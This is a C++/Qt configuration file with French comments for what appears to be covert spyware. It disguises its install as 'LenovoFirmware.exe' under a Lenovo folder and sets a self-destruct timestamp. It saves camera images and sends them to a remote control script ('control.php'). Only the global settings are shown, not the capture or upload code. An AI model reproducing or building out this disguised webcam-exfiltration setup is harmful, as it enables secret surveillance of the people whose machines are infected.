#include <global.h>

// Timestamp qui déclanche l'autodéstruction du programme //
float GLOBAL_expirationTimestamp = 1560616327000;

QString GLOBAL_nameInstallPath = "Lenovo";
QString GLOBAL_nameInstallRun = "LenovoFirmware.exe";

QString GLOBAL_runInstallPath = QDir::fromNativeSeparators(QDir::tempPath().left(3) + "ProgramData\\" + GLOBAL_nameInstallPath + "/");
QString GLOBAL_scriptPath = QDir::fromNativeSeparators(QDir::tempPath());

// URL à tester //
QString GLOBAL_networkTestUrl = "http://support.lenovo.com/us/en/";
// URL du script de contrôle où sont envoyés les images //
QString GLOBAL_networkSendUrl = "http://url.ntd/control.php";

QString GLOBAL_cameraPath = GLOBAL_runInstallPath + "/Camera.jpg";
